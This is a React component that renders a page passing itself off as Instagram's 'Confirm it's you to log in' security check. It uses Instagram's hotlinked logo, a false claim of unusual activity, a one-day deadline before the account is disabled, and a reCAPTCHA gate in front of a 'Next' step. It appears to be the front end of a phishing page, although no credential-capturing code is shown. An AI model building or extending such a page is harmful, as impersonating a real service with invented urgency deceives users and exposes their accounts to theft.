import React from 'react'
import './ForgetPassword.scss'
import ReCAPTCHA from "react-google-recaptcha";
import { useState } from 'react'
const Recaptcha = () => {

    const [isverify , setIsVerify] = useState(false)

    const handleRecaptcha = () => {
        setIsVerify(true)
    }

    const text = () => {
        alert()
    }

  return (
    <>
        <div className='tobbar_container'>
            <div className="tobbar_wrapper">
                <div className="logo">
                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="" />
                </div>
                <div className="tobbai_menu">
                    <span className='another-account'> Login to another account </span>
                </div>
            </div>
        </div>

        <div className="forget_password_section mt">
        <div className="forget_password_body">
            <div className="reacptcha-area">
                <span className='recap-heading'> Confirm it's you to log in </span>
                <span className='recap-top-content'> We noticed unusual activity from your account, so we've logged you out. </span>
                <span className='recap-top-content'> Follow the next steps within 1 day so we can try to get you back into your account before it's disabled. </span>
                <div className="recaptcha">
                    <ReCAPTCHA
                    sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"
                    onChange={handleRecaptcha}
                    />,
                </div>
                <span className='footer-content'> This helps us to combat harmful conduct, detect and prevent spam, and maintain the integrity of our Products.</span>
                <span className='footer-content'> We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.</span>
                <span className='footer-content'> reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalised advertising. </span>
            </div>
        </div>
        <div className="reacaptcha-footer">
            <a disabled={!isverify} className='cap-next'> Next </a>
        </div>

    </div>
    </>

  )
}

export default Recaptcha